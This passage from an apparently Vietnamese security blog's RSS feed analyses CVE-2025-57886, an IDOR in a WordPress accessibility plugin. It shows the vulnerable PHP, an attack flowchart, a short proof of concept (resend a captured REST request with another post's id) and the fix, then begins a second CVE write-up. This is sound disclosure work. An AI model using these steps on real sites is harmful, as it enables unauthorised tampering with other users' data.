g·ªìm:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra ƒë·∫ßu v√†o&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Missing violations&amp;#39; ], 400);&#xA;}&#xA;$post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;$post = get_post( $post_id );&#xA;if ( ! is_object( $post ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid post&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra post type&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post_type  = get_post_type( $post );&#xA;$post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Post type not allowed&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X·ª≠ l√Ω violations&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rules = edac_register_rules();&#xA;foreach ( $request[&amp;#39;violations&amp;#39;] as $violation ) {&#xA;    $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;    // L·ªçc rule h·ª£p l·ªá v√† l∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu&#xA;    (new Insert_Rule_Data())-&amp;gt;insert( $post, $rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;C·∫≠p nh·∫≠t post meta v√† summary&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr·∫£ response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return new \WP_REST_Response([&#xA;    &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;    &amp;#39;id&amp;#39; =&amp;gt; $post_id,&#xA;    &amp;#39;timestamp&amp;#39; =&amp;gt; time()&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Attacker c√≥ &lt;strong&gt;Contributor account&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t√πy √Ω thao t√∫ng tham s·ªë &lt;code&gt;id&lt;/code&gt; do client ki·ªÉm so√°t&lt;/strong&gt;, tr·ªè t·ªõi &lt;strong&gt;b·∫•t k·ª≥ post n√†o&lt;/strong&gt;, trong khi ki·ªÉm tra quy·ªÅn ch·ªâ d·ª±a tr√™n &lt;code&gt;edit_posts&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p attacker &lt;strong&gt;ghi ho·∫∑c ghi ƒë√® d·ªØ li·ªáu &lt;code&gt;violations&lt;/code&gt; v√†o post kh√¥ng thu·ªôc quy·ªÅn s·ªü h·ªØu&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;thay ƒë·ªïi tr√°i ph√©p d·ªØ li·ªáu c·ªßa ng∆∞·ªùi d√πng kh√°c (IDOR)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi t·∫°o post b·∫±ng Contributor user, b·∫°n s·∫Ω th·∫•y ph·∫ßn th·ªëng k√™ c·ªßa &lt;strong&gt;Accessibility Checker&lt;/strong&gt; xu·∫•t hi·ªán ngay trong trang ch·ªânh s·ª≠a b√†i vi·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#34; title=&#34;Th·ªëng k√™ c·ªßa Accessibility Checker&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/post.png&#34; data-sub-html=&#34;&lt;h2&gt;Post&lt;/h2&gt;&lt;p&gt;Th·ªëng k√™ c·ªßa Accessibility Checker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#39; alt=&#34;Post&#34; height=&#34;1048&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Th·ªëng k√™ c·ªßa Accessibility Checker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th·ª≠ filter request b·∫±ng c·ª•m t·ª´ &lt;code&gt;post-scan-results&lt;/code&gt; trong Burp History, b·∫°n s·∫Ω b·∫Øt ƒë∆∞·ª£c request h·ª£p l·ªá do plugin cung c·∫•p s·∫µn:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#34; title=&#34;Filter request trong Burp History&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Filter request trong Burp History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#39; alt=&#34;Request&#34; height=&#34;1357&#34; width=&#34;1277&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter request trong Burp History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ch·ªâ c·∫ßn s·ª≠a ƒë·ªëi gi√° tr·ªã &lt;code&gt;id&lt;/code&gt;, ta c√≥ th·ªÉ &lt;strong&gt;thay ƒë·ªïi tr√°i ph√©p d·ªØ li·ªáu&lt;/strong&gt; trong post c·ªßa ng∆∞·ªùi kh√°c.&lt;/p&gt;&#xA;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;v1.30.1&lt;/strong&gt; ƒë√£ s·ª≠a l·ªó h·ªïng b·∫±ng c√°ch thay ƒë·ªïi &lt;strong&gt;permission callback&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;user_can_edit_passed_post_id( $request );&#xA;}&#xA;&#xA;public function user_can_edit_passed_post_id( $request ) {&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Callback gi·ªù nh·∫≠n &lt;code&gt;$request&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra &lt;strong&gt;post c·ª• th·ªÉ&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; ‚Üí WordPress x√°c minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;User c√≥ quy·ªÅn ch·ªânh s·ª≠a post n√†y hay kh√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;Post c√≥ thu·ªôc s·ªü h·ªØu c·ªßa user hay kh√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫°ng th√°i post (draft, published, private) c√≥ cho ph√©p thao t√°c kh√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated attacker (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Craft POST request to REST API&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;POST /wp-json/accessibility-checker/v1/post-scan-results/{id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Manipulate {id} to target post_id&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Permission granted&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;set_post_scan_results()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;get_post(target_post_id)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Process violations data&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;update_post_meta(target_post_id, _edac_*)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Target post data modified&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o/edit post b·∫±ng &lt;strong&gt;Contributor&lt;/strong&gt; account&lt;/li&gt;&#xA;&lt;li&gt;B·∫Øt request ƒë·∫øn &lt;code&gt;/wp-json/accessibility-checker/v1/post-scan-results/{id}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi &lt;code&gt;id&lt;/code&gt; post c·ªßa user kh√°c v·ªõi &lt;code&gt;violations&lt;/code&gt; t√πy √Ω.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-57886 l√† m·ªôt l·ªó h·ªïng &lt;strong&gt;IDOR trong REST API&lt;/strong&gt; do plugin &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; ch·ªâ ki·ªÉm tra quy·ªÅn ·ªü m·ª©c &lt;strong&gt;capability t·ªïng qu√°t (&lt;code&gt;edit_posts&lt;/code&gt;)&lt;/strong&gt; m√† kh√¥ng x√°c th·ª±c &lt;strong&gt;quy·ªÅn ch·ªânh s·ª≠a tr√™n post c·ª• th·ªÉ&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p attacker c√≥ quy·ªÅn Contributor &lt;strong&gt;t√πy √Ω thao t√∫ng tham s·ªë &lt;code&gt;id&lt;/code&gt;&lt;/strong&gt; trong request REST API ƒë·ªÉ &lt;strong&gt;ghi ho·∫∑c ghi ƒë√® d·ªØ li·ªáu accessibility&lt;/strong&gt; l√™n c√°c b√†i vi·∫øt kh√¥ng thu·ªôc quy·ªÅn s·ªü h·ªØu, d·∫´n ƒë·∫øn &lt;strong&gt;thay ƒë·ªïi tr√°i ph√©p d·ªØ li·ªáu&lt;/strong&gt;. Phi√™n b·∫£n 1.30.1 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch √°p d·ª•ng &lt;strong&gt;post-level authorization&lt;/strong&gt; th√¥ng qua &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;REST API s·ª≠ d·ª•ng &lt;strong&gt;object identifier do client ki·ªÉm so√°t&lt;/strong&gt; ph·∫£i lu√¥n ƒëi k√®m &lt;strong&gt;ki·ªÉm tra quy·ªÅn tr√™n object c·ª• th·ªÉ&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Global capability check&lt;/strong&gt; (&lt;code&gt;edit_posts&lt;/code&gt;) kh√¥ng ƒë·ªß ƒë·ªÉ b·∫£o v·ªá c√°c thao t√°c ghi d·ªØ li·ªáu theo &lt;code&gt;post_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR c√≥ th·ªÉ x·∫£y ra ngay c·∫£ khi request ƒë∆∞·ª£c t·∫°o t·ª´ &lt;strong&gt;logic h·ª£p l·ªá ph√≠a client&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong WordPress, &lt;strong&gt;&lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;&lt;/strong&gt; l√† bi·ªán ph√°p chu·∫©n ƒë·ªÉ ngƒÉn ch·∫∑n IDOR ·ªü m·ª©c post.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint REST &lt;strong&gt;ghi d·ªØ li·ªáu&lt;/strong&gt; c·∫ßn ƒë∆∞·ª£c xem l√† b·ªÅ m·∫∑t t·∫•n c√¥ng ∆∞u ti√™n khi audit plugin.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/accessibility-checker/vulnerability/wordpress-accessibility-checker-by-equalize-digital-plugin-1-30-0-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin &amp;lt;= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12954 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</link>
      <pubDate>Sun, 21 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-21-cve-2025-12954/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;Timetable and Event Schedule by MotoPress&lt;/strong&gt; (tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;2.4.16&lt;/strong&gt;) kh√¥ng ki·ªÉm tra li·ªáu ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o &lt;strong&gt;event c·ª• th·ªÉ&lt;/strong&gt; khi th·ª±c hi·ªán thao t√°c duplicate, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;l·ªô th√¥ng tin event m·ªôt c√°ch t√πy √Ω&lt;/strong&gt; ƒë·ªëi v·ªõi ng∆∞·ªùi d√πng c√≥ vai tr√≤ th·∫•p nh∆∞ &lt;strong&gt;Contributor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12954&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12954&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mp-timetable/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Timetable and Event Schedule&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.15&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.16&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 